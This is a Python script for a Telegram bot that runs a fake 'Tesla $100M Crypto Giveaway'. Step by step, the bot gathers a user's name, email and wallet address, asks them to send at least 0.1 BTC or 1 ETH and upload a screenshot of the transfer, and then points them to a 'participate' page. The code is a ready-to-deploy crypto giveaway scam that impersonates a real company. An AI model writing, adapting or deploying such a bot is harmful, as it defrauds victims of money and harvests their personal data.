import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define conversation states
(
    NAME,
    EMAIL,
    WALLET,
    COIN,
    AMOUNT,
    SCREENSHOT,
    CONFIRM,
    SOURCE
) = range(8)

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    banner_url = "https://yourwebsite.com/assets/welcome_banner.png"  # Replace with your hosted banner image URL
    await update.message.reply_photo(
        banner_url,
        caption=(
            "👋 *Welcome to the Tesla $100M Crypto Giveaway!*\n\n"
            "📝 Let's get you registered.\n\n"
            "What’s your full name?"
        ),
        parse_mode='Markdown'
    )
    return NAME

# Ask questions step by step
async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["name"] = update.message.text
    await update.message.reply_text("2️⃣ What’s your email address?")
    return EMAIL

async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["email"] = update.message.text
    await update.message.reply_text("3️⃣ What wallet address will you use to participate?")
    return WALLET

async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["wallet"] = update.message.text
    await update.message.reply_text("4️⃣ Which coin do you want to use (BTC or ETH)?")
    return COIN

async def get_coin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["coin"] = update.message.text
    await update.message.reply_text("5️⃣ How much are you sending? (Min: 0.1 BTC or 1 ETH)")
    return AMOUNT

async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["amount"] = update.message.text
    await update.message.reply_text("6️⃣ Upload a screenshot of your transaction (optional). Send photo or type 'skip'.")
    return SCREENSHOT

async def get_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        photo_file_id = update.message.photo[-1].file_id
        context.user_data["screenshot"] = photo_file_id
    else:
        context.user_data["screenshot"] = "Skipped"
    await update.message.reply_text("7️⃣ Do you confirm your participation? (yes/no)")
    return CONFIRM

async def get_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["confirm"] = update.message.text
    await update.message.reply_text("8️⃣ Where did you hear about this giveaway?")
    return SOURCE

async def get_source(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["source"] = update.message.text

    # Final message with redirect button
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Proceed to Participate Page", url="https://yourwebsite.com/participate.html")]
    ])

    await update.message.reply_text(
        f"✅ Thank you, {context.user_data['name']}! Our team will verify your transaction and notify you via email: {context.user_data['email']}.\n\n"
        "Click the button below to proceed to the participation page to complete your transaction.",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

# Cancel command
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚫 Registration cancelled.")
    return ConversationHandler.END

# Main function to run the bot
def main():
    application = ApplicationBuilder().token("YOUR_BOT_TOKEN").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
            EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
            WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_wallet)],
            COIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_coin)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
            SCREENSHOT: [MessageHandler(filters.PHOTO | (filters.TEXT & ~filters.COMMAND), get_screenshot)],
            CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_confirm)],
            SOURCE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_source)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)

    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
